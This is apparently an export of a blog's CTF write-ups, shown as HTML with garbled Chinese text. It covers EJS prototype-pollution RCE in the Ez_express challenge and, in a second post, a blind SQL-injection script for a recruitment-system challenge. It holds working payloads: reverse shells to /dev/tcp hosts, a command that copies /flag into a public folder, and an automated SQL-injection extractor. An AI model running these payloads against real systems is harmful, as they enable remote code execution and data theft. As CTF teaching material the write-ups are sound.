[], __append = __output.push.bind(__output);'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">        prepended += <span class="string">'  var '</span> + opts.outputFunctionName + <span class="string">' = __append;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (opts._with !== <span class="literal">false</span>) &#123;</span><br><span class="line">        prepended +=  <span class="string">'  with ('</span> + opts.localsName + <span class="string">' || &#123;&#125;) &#123;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">        appended += <span class="string">'  &#125;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      appended += <span class="string">'  return __output.join("");'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      <span class="keyword">this</span>.source = prepended + <span class="keyword">this</span>.source + appended;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opts.compileDebug) &#123;</span><br><span class="line">      src = <span class="string">'var __line = 1'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'  , __lines = '</span> + <span class="built_in">JSON</span>.stringify(<span class="keyword">this</span>.templateText) + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'  , __filename = '</span> + (opts.filename ?</span><br><span class="line">        <span class="built_in">JSON</span>.stringify(opts.filename) : <span class="string">'undefined'</span>) + <span class="string">';'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'try &#123;'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="keyword">this</span>.source</span><br><span class="line">        + <span class="string">'&#125; catch (e) &#123;'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'  rethrow(e, __lines, __filename, __line, escapeFn);'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'&#125;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      src = <span class="keyword">this</span>.source;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (opts.async) &#123;</span><br><span class="line">        <span class="comment">// Have to use generated function for this, since in envs without support,</span></span><br><span class="line">        <span class="comment">// it breaks in parsing</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          ctor = (<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'return (async function()&#123;&#125;).constructor;'</span>))();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="built_in">SyntaxError</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'This environment does not support async/await'</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        ctor = <span class="built_in">Function</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      fn = <span class="keyword">new</span> ctor(opts.localsName + <span class="string">', escapeFn, include, rethrow'</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      <span class="comment">// istanbul ignore else</span></span><br><span class="line">      <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="built_in">SyntaxError</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opts.filename) &#123;</span><br><span class="line">          e.message += <span class="string">' in '</span> + opts.filename;</span><br><span class="line">        &#125;</span><br><span class="line">        e.message += <span class="string">' while compiling ejs\n\n'</span>;</span><br><span class="line">        e.message += <span class="string">'If the above error is not helpful, you may want to try EJS-Lint:\n'</span>;</span><br><span class="line">        e.message += <span class="string">'https://github.com/RyanZim/EJS-Lint'</span>;</span><br><span class="line">        <span class="keyword">if</span> (!e.async) &#123;</span><br><span class="line">          e.message += <span class="string">'\n'</span>;</span><br><span class="line">          e.message += <span class="string">'Or, if you meant to create an async function, pass async: true as an option.'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opts.client) &#123;</span><br><span class="line">      fn.dependencies = <span class="keyword">this</span>.dependencies;</span><br><span class="line">      <span class="keyword">return</span> fn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a callable function which will execute the function</span></span><br><span class="line">    <span class="comment">// created by the source-code, with the passed data as locals</span></span><br><span class="line">    <span class="comment">// Adds a local `include` function which allows full recursive include</span></span><br><span class="line">    <span class="keyword">var</span> returnedFn = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> include = <span class="function"><span class="keyword">function</span> (<span class="params">path, includeData</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> d = utils.shallowCopy(&#123;&#125;, data);</span><br><span class="line">        <span class="keyword">if</span> (includeData) &#123;</span><br><span class="line">          d = utils.shallowCopy(d, includeData);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> includeFile(path, opts)(d);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> fn.apply(opts.context, [data || &#123;&#125;, escapeFn, include, rethrow]);</span><br><span class="line">    &#125;;</span><br><span class="line">    returnedFn.dependencies = <span class="keyword">this</span>.dependencies;</span><br><span class="line">    <span class="keyword">return</span> returnedFn;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225182824684.png" alt="image-20200225182824684"></p>
<p>compileå‡½æ•°ä¸­å†è¿™é‡Œå…ˆåˆ¤æ–­äº†outputFunctionNameæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±æ‹¼æ¥åˆ°prepended,ç„¶åå†ä¼ ç»™this.source,</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225183013346.png" alt="image-20200225183013346"></p>
<p>è¿™é‡ŒcompileDebugä¸ºTRUE,ä¼šæŠŠthis.sourceæ‹¼æ¥åˆ°src,</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225183207866.png" alt="image-20200225183207866"></p>
<p>è¿™é‡Œæ¶‰åŠåˆ°Functionæ„é€ å‡½æ•°ã€‚</p>
<blockquote>
<p><strong><code>Function</code> æ„é€ å‡½æ•°</strong>åˆ›å»ºä¸€ä¸ªæ–°çš„ <code>Function</code> <strong>å¯¹è±¡</strong>ã€‚ç›´æ¥è°ƒç”¨æ­¤æ„é€ å‡½æ•°å¯ç”¨åŠ¨æ€åˆ›å»ºå‡½æ•°ï¼Œä½†ä¼šé­é‡æ¥è‡ª <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/eval" target="_blank" rel="noopener"><code>eval</code></a> çš„å®‰å…¨é—®é¢˜å’Œç›¸å¯¹è¾ƒå°çš„æ€§èƒ½é—®é¢˜ã€‚ç„¶è€Œï¼Œä¸ eval ä¸åŒçš„æ˜¯ï¼ŒFunction æ„é€ å‡½æ•°åªåœ¨å…¨å±€ä½œç”¨åŸŸä¸­è¿è¡Œã€‚</p>
<p>æ¯ä¸ª JavaScript å‡½æ•°å®é™…ä¸Šéƒ½æ˜¯ä¸€ä¸ª <code>Function</code> å¯¹è±¡ã€‚è¿è¡Œ <code>(function(){}).constructor === Function</code> ä¾¿å¯ä»¥å¾—åˆ°è¿™ä¸ªç»“è®ºã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sum = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'return a + b'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">2</span>, <span class="number">6</span>));</span><br></pre></td></tr></table></figure>
</blockquote>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225193150541.png" alt="image-20200225193150541"></p>
<p>ä¹‹åå°†returnedFnè¿”å›ã€‚æˆ‘ä»¬å¯ä»¥çœ‹ä¸‹compileå‡½æ•°ä¸­optså˜é‡çš„outputFunctinName  ä¸ºundefined,æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥å¯¹outputFunctionName è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œè¾¾åˆ°rceçš„æ•ˆæœã€‚</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225181608175.png" alt></p>
<p>æˆ‘ä»¬å†æ¢³ç†ä¸€ä¸‹è°ƒç”¨æ ˆï¼š</p>
<ol>
<li>server.js :: res.render()</li>
<li>response.js  :: render()</li>
<li>application.js :: render()</li>
<li>application.js :: tryRender()</li>
<li>view.js :: render()</li>
<li>ejs.js ::  exports.renderFile()</li>
<li>ejs.js :: tryHandleCache()</li>
<li>ejs.js :: handleCache()</li>
<li>ejs.js :: exports.compile()</li>
<li>ejs.js :: compile()</li>
<li>ejs.js  :: fn = new ctor(opts.localsName + â€˜, escapeFn, include, rethrowâ€™, src)</li>
<li>ejs.js  :: fn.apply(opts.context, [data || {}, escapeFn, include, rethrow])</li>
</ol>
<p>ç„¶ååœ¨è¿™é“é¢˜ä¸Šï¼Œæˆ‘ä»¬å¼€å§‹åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“è¿›è¡Œrce.</p>
<p>payload:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"content"</span>: &#123;</span><br><span class="line">        <span class="attr">"constructor"</span>: &#123;</span><br><span class="line">            <span class="attr">"prototype"</span>: &#123;</span><br><span class="line">            <span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/xxx/xx 0&gt;&amp;1\"');var __tmp2"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"test"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225195631671.png" alt="image-20200225195631671"></p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225195717892.png" alt="image-20200225195717892"></p>
<h3 id="ichunqiu-æ–°æ˜¥å…¬ç›Šèµ›-Ez-express"><a href="#ichunqiu-æ–°æ˜¥å…¬ç›Šèµ›-Ez-express" class="headerlink" title="ichunqiu æ–°æ˜¥å…¬ç›Šèµ› Ez_express"></a>ichunqiu æ–°æ˜¥å…¬ç›Šèµ› Ez_express</h3><p>è¿™é“é¢˜ç›®ä¹Ÿç»™äº†æºç ï¼Œæœ‰ä¸‹é¢å‡ ä¸ªè·¯ç”±ï¼š</p>
<ul>
<li>/   ï¼šå¦‚æœæ²¡ç™»å½•ä¼šè·³è½¬åˆ°/login</li>
<li>/login  <ul>
<li>get  æ— ç‰¹æ®ŠåŠŸèƒ½</li>
<li>post  è‹¥submitä¸ºregisterä¸ºæ³¨å†Œï¼Œè‹¥submitä¸ºloginä¸ºç™»å½•ã€‚</li>
</ul>
</li>
<li>/action : åªæœ‰adminå¯ä»¥ç”¨</li>
<li>/info  ï¼šæ— ç‰¹æ®ŠåŠŸèƒ½</li>
</ul>
<p>æ¥ä¸‹æ¥å®¡è®¡æºç ï¼Œå…ˆçœ‹routes/index.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.session.user)&#123;</span><br><span class="line">    res.redirect(<span class="string">'/login'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=<span class="literal">undefined</span>;</span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'login'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">"register"</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">'user'</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">'passwd'</span>: req.body.pwd,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">'/'</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">"login"</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;"</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(<span class="string">'/'</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">"ADMIN"</span>)&#123;res.end(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  <span class="comment">//console.log(req.session.user.data)</span></span><br><span class="line">  <span class="comment">//console.log(res.outputFunctionName)</span></span><br><span class="line">  res.end(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">'/info'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨æ³¨å†Œçš„æ—¶å€™ï¼ŒsafeKeyword()å‡½æ•°ä¼šæ£€æµ‹ç¦æ­¢æ³¨å†Œuseridä¸ºadmin(åŒ…æ‹¬å¤§å°å†™)ï¼Œå¦‚æœé€šè¿‡safeKeyword()å‡½æ•°éªŒè¯ï¼Œå°±ç”¨toUpperCase()å‡½æ•°å°†è¾“å…¥çš„useridå˜æˆå¤§å†™ï¼Œèµ‹å€¼ç»™sessionã€‚</p>
<p>ç„¶åå†<code>/action</code>è·¯ç”±ä¸­é€šè¿‡æ¯”è¾ƒreq.session.user.user!=â€ADMINâ€æ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦æ˜¯adminã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å‚è€ƒPç¥ä¹‹å‰å‘çš„ä¸€ç¯‡å…³äºjavascriptçš„å¤§å°å†™çš„å°ç‰¹æ€§çš„<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">æ–‡ç« </a>ï¼Œåˆ©ç”¨å…¶ä¸­ç‰¹æ€§æ¥ç»•è¿‡ã€‚</p>
<blockquote>
<p>è¿™ä¸¤ä¸ªå­—ç¬¦çš„â€œå¤§å†™â€æ˜¯Iå’ŒSã€‚ä¹Ÿå°±æ˜¯è¯´â€Ä±â€.toUpperCase() == â€˜Iâ€™ï¼Œâ€Å¿â€.toUpperCase() == â€˜Sâ€™ã€‚é€šè¿‡è¿™ä¸ªå°ç‰¹æ€§å¯ä»¥ç»•è¿‡ä¸€äº›é™åˆ¶ã€‚</p>
<p>è¿™ä¸ªâ€â„ªâ€çš„â€œå°å†™â€å­—ç¬¦æ˜¯kï¼Œä¹Ÿå°±æ˜¯â€â„ªâ€.toLowerCase() == â€˜kâ€™.</p>
</blockquote>
<p>ç»•è¿‡è¿™é‡Œä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°/actionä¸­è°ƒç”¨äº†clone()å‡½æ•°ï¼Œclone()åˆè°ƒç”¨äº†merge()å‡½æ•°ï¼Œè¿™é‡Œå°±å¯ä»¥å‘ç”ŸåŸå‹é“¾æ±¡æŸ“ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼Œè¿™é‡Œæ˜¯å¦å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œ</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225215922481.png" alt="image-20200225215922481"></p>
<p>ç»“æœæ˜¯å¯ä»¥çš„ï¼Œç„¶åå¯ä»¥çœ‹åˆ°è¿™é‡Œç”¨çš„ä¹Ÿæ˜¯ejsçš„æ¸²æŸ“å¼•æ“ï¼Œç„¶åæˆ‘ä»¬ç»§ç»­æ±¡æŸ“outputFunctionNameï¼Œæ¥RCEã€‚</p>
<p>paylaod</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/174.0.197.203/8888 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225220249254.png" alt="image-20200225220249254"></p>
<p>ç„¶åè®¿é—®ä¸€ä¸‹ç½‘é¡µè§¦å‘render()å‡½æ•°ã€‚åœ¨vpsä¸Šæ”¶flag.</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225220420908.png" alt="image-20200225220420908"></p>
<p>å¦å¤–ä¹Ÿå¯ä»¥æŠŠflagè¯»åˆ°è¯»åˆ°publicæ–‡ä»¶å¤¹ï¼Œ</p>
<p>payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"cat /flag&gt; /app/public/flag\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®flagï¼Œå³å¯ä¸‹è½½ã€‚</p>
<p>å‚è€ƒï¼š</p>
<p><a href="https://www.xmsec.cc/prototype-pollution-notes/" target="_blank" rel="noopener">https://www.xmsec.cc/prototype-pollution-notes/</a></p>
<p><a href="https://xz.aliyun.com/t/6113" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113</a></p>
]]></content>
      <tags>
        <tag>JavaScriptåŸå‹é“¾æ±¡æŸ“</tag>
      </tags>
  </entry>
  <entry>
    <title>2020æ–°æ˜¥æˆ˜å½¹ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›webéƒ¨åˆ†é¢˜è§£</title>
    <url>/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/</url>
    <content><![CDATA[<p>æ‰“äº†ichunqiuçš„æ–°æ˜¥å…¬ç›Šèµ›ï¼Œwebé¢˜å¤§éƒ¨åˆ†æ¯”è¾ƒå‹å¥½ã€‚</p>
<a id="more"></a>

<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day_1"></a>Day_1</h2><h3 id="ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"><a href="#ç®€å•çš„æ‹›è˜ç³»ç»Ÿ" class="headerlink" title="ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"></a>ç®€å•çš„æ‹›è˜ç³»ç»Ÿ</h3><p>è¿›å»ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå¯ä»¥æ³¨å†Œï¼Œå¼€å§‹çœ‹åˆ°forgotï¼Œä½†æ˜¯æ²¡æœ‰å¿˜è®°å¯†ç çš„é“¾æ¥ï¼Œæ³¨å†Œç™»è¿›å»åï¼Œæœ‰ä¸ªæŸ¥è¯¢ç•Œé¢éœ€è¦adminæƒé™ï¼Œç„¶åæ³¨å†Œadminç”¨æˆ·ä¹Ÿæ²¡æœ‰æƒé™ï¼Œä¹‹åè¯•ç€å¯ä»¥ç”¨ä¸‡èƒ½å¯†ç è¿›æ¥ï¼Œç„¶åå†æŸ¥è¯¢keyçš„ç•Œé¢æµ‹äº†åŠå¤©ï¼Œå•¥ä¹Ÿæ²¡å‡ºæ¥ï¼Œåæ¥ä¸€æƒ³ä¸‡èƒ½å¯†ç éƒ½å¯ä»¥ç™»ï¼Œé‚£ä¹ˆç™»å½•å‡ºå°±å¯ä»¥æ³¨äº†ã€‚ã€‚ã€‚</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://724572ef5f71464aa9d50b6a9540181cf1f2d153e3ee45e7.changame.ichunqiu.com/index.php"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		<span class="comment">#payload=r"admin' and 1=(ascii(mid((select group_concat(column_NAME) from information_schema.columnS where table_name='flag'),&#123;&#125;,1))&gt;&#123;&#125;) or '1"</span></span><br><span class="line">		payload=<span class="string">r"admin' and 1=(ascii(mid((select flaaag from flag limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;) or '1"</span></span><br><span class="line">		data=&#123;<span class="string">"lname"</span>:payload.format(i,mid),<span class="string">"lpass"</span>:<span class="string">"ff"</span>&#125;</span><br><span class="line">		print(payload.format(i,mid))</span><br><span class="line">		r=requests.post(url,data=data)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">b"./zhaopin.php"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag)</span><br><span class="line">	<span class="comment">#backup,flag,user</span></span><br><span class="line">	<span class="comment">#id,flaaag</span></span><br></pre></td></tr></table></figure>

<p>æ›´æ–°ï¼šä¹‹å‰è¯´åœ¨keyé‚£é‡Œè¯•äº†åŠå¤©æ²¡æœ‰æˆåŠŸï¼Œå½“æ—¶order by æ—¶é¢˜ç›®æŠ¥é”™ä¸€ç›´åœ¨çŒœåå°çš„sqlè¯­å¥ï¼Œåæ¥çœ‹äº†<a href="https://www.gem-love.com/ctf/1669.html#i" target="_blank" rel="noopener">é¢–å¥‡å¸ˆå‚…çš„wpå</a>ï¼Œè¿™é‡Œå°½ç®¡æŠ¥é”™è¿˜æ˜¯å¯ä»¥æ³¨å…¥çš„ã€‚</p>
<p>é¦–å…ˆç”¨<code>oeder by</code>æŸ¥åˆ—æ•°</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200224124224465.png" alt="image-20200224124224465"></p>
<p>ç„¶åçœ‹å›æ˜¾ä½ï¼Œä¸º2ï¼ŒæŸ¥è¡¨</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200224123828230.png" alt="image-20200224123828230"></p>
<p>æŸ¥åˆ—</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200224124516526.png" alt="image-20200224124516526"></p>
<p>æŸ¥flag</p>
